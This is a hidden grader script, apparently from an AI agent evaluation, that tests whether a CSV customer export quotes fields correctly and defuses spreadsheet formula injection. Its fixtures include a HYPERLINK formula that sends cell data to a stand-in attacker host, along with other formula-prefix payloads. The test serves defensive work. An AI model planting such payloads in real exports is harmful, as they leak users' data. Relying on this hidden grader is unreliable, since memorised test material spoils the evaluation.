"""Hidden test. Not shown to the agent. Run after the arm finishes.

Prints PASS/FAIL per check and SCORE: n/m; exits 0 only on a full score. Each check runs
with a time limit, so a hang counts as a failure instead of stalling the run.
"""
GRADER_VERSION = 1
import importlib, os, sys, threading, time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
CHECKS = []


def check(name, timeout=20):
    def register(fn):
        CHECKS.append((name, fn, timeout))
        return fn
    return register


def load(module):
    """A fresh import of the module the agent edited."""
    sys.modules.pop(module, None)
    return importlib.import_module(module)


def main():
    print("GRADER: behavioral")
    passed = 0
    for name, fn, timeout in CHECKS:
        result = {}

        def run():
            try:
                fn()
                result["ok"] = True
            except BaseException as exc:  # noqa: BLE001 - every failure is a FAIL line
                result["error"] = f"{type(exc).__name__}: {exc}"[:300]

        worker = threading.Thread(target=run, daemon=True)
        worker.start()
        worker.join(timeout)
        if worker.is_alive():
            result["error"] = f"timed out after {timeout}s"
        if result.get("ok"):
            passed += 1
            print(f"PASS {name}")
        else:
            print(f"FAIL {name} {result.get('error')}")
    print(f"SCORE: {passed}/{len(CHECKS)}")
    sys.stdout.flush()
    os._exit(0 if passed == len(CHECKS) else 1)

import csv, io

ROWS = [
    {"name": "Lee, Ann", "email": "ann@example.com", "note": 'says "hi"\nline two', "balance": 12.5},
    {"name": "Bob", "email": "bob@example.com", "note": "plain", "balance": 0},
]
EVIL = [
    {"name": '=HYPERLINK("http://evil.example/?"&A1,"Click")', "email": "e@example.com", "note": "+1+1", "balance": 1},
    {"name": "@SUM(1+1)", "email": "f@example.com", "note": "-2+3", "balance": 2},
]


def _read(e, rows):
    buf = io.StringIO(); e.export_customers(rows, buf)
    return list(csv.reader(io.StringIO(buf.getvalue())))


@check("quotes-commas-quotes-newlines")
def _():
    e = load("export"); got = _read(e, ROWS)
    assert got[0] == ["name", "email", "note", "balance"], got[0]
    assert got[1][:3] == ["Lee, Ann", "ann@example.com", 'says "hi"\nline two'], got[1]
    assert len(got) == 3, f"{len(got)} rows"


@check("neutralizes-spreadsheet-formulas")
def _():
    e = load("export"); got = _read(e, EVIL)
    cells = [c for row in got[1:] for c in row[:3]]
    live = [c for c in cells if c[:1] in ("=", "+", "-", "@", "\t", "\r")]
    assert not live, f"cells Excel would execute as formulas: {live}"
    assert any("HYPERLINK" in c for c in cells), "the value was dropped instead of neutralized"


if __name__ == "__main__":
    main()
